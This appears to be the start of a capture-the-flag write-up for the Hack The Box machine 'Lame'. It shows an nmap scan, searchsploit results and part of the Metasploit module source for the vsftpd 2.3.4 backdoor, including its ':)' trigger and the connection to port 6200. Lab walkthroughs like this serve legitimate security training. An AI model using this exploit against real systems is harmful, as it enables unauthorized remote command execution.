---
cover: >-
  https://images.unsplash.com/photo-1625768375325-ce6bdd4a2329?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwyfHxsYW1lfGVufDB8fHx8MTcwMTk0ODYxOXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# Recon

## nmap

Let's start with nmap to perform active scanning on the target machine. 

```bash
nmap -vvv -Pn -sCV -p0-65535 --reason -oN lame.nmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.23s latency).
Scanned at 2023-11-01 07:02:56 EDT for 405s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  @þ¯NV      syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 36056/tcp): CLEAN (Timeout)
|   Check 3 (port 40169/udp): CLEAN (Timeout)
|   Check 4 (port 26132/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h59m45s, deviation: 2h49m43s, median: -15s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-11-01T07:08:44-04:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  1 07:09:41 2023 -- 1 IP address (1 host up) scanned in 405.22 seconds
```

As you can see in the output of nmap scan, there are a few things opening for us to exploit such as vsftp, ssh, smb and distccd. From what we know about the target, let's explore those options in details by utilising searchsploit for the potential exploits and vulnerabilities. 
## searchsploit

Let's start with vsFTPd for searchsploit as shown below.

```bash
searchsploit vsFTPd  
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                             | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                             | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                             | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                           | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                     | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                    | multiple/remote/49719.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The exploit "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)" looks quite promising since it is the version the target machine is running on it. If you are curious about the exploit in more details, we can drill into it as below.

```bash
searchsploit -x 17491
##
# $Id: vsftpd_234_backdoor.rb 13099 2011-07-05 05:20:47Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::Tcp

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'VSFTPD v2.3.4 Backdoor Command Execution',
                        'Description'    => %q{
                                        This module exploits a malicious backdoor that was added to the VSFTPD download
                                        archive. This backdoor was introdcued into the vsftpd-2.3.4.tar.gz archive between
                                        June 30th 2011 and July 1st 2011 according to the most recent information
                                        available. This backdoor was removed on July 3rd 2011.
                        },
                        'Author'         => [ 'hdm', 'mc' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 13099 $',
                        'References'     =>
                                [
                                        [ 'URL', 'http://pastebin.com/AetT9sS5'],
                                        [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' ],
                                ],
                        'Privileged'     => true,
                        'Platform'       => [ 'unix' ],
                        'Arch'           => ARCH_CMD,
                        'Payload'        =>
                                {
                                        'Space'    => 2000,
                                        'BadChars' => '',
                                        'DisableNops' => true,
                                        'Compat'      =>
                                                {
                                                        'PayloadType'    => 'cmd_interact',
                                                        'ConnectionType' => 'find'
                                                }
                                },
                        'Targets'        =>
                                [
                                        [ 'Automatic', { } ],
                                ],
                        'DisclosureDate' => 'Jul 3 2011',
                        'DefaultTarget' => 0))

                register_options([ Opt::RPORT(21) ], self.class)
        end

        def exploit

                nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
                if nsock
                        print_status("The port used by the backdoor bind listener is already open")
                        handle_backdoor(nsock)
                        return
                end

                # Connect to the FTP service port first
                connect

                banner = sock.get_once(-1, 30).to_s
                print_status("Banner: #{banner.strip}")

                sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
                resp = sock.get_once(-1, 30).to_s
                print_status("USER: #{resp.strip}")

# More Ruby Code HERE.....
```

